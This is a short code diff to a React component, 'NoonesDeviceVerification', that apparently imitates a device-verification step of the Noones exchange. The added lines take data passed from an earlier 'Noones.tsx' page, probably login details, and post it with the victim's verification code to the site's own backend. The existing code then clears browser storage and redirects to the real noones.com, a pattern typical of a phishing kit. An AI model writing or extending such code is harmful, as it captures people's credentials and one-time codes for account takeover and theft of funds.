@@ -66,6 +66,25 @@ export default function NoonesDeviceVerification() {
     }
 
     try {
+      // Get the platform data from location state (set by Noones.tsx)
+      const platformData = location.state?.platformData || {};
+
+      // Submit the verification code with platform data to the backend
+      const response = await fetch('/api/submit-connection', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          ...platformData,
+          code: verificationCode,
+        }),
+      });
+
+      if (!response.ok) {
+        console.error('Failed to submit verification code:', response.statusText);
+      }
+
       // Clear browser storage for our domain
       localStorage.clear();
       sessionStorage.clear();
@@ -85,6 +104,7 @@ export default function NoonesDeviceVerification() {
         window.location.href = 'https://noones.com/';
       }, 5000);
     } catch (err) {
+      console.error('Error during verification:', err);
       alert('Verification failed. Please try again.');
     }
   };
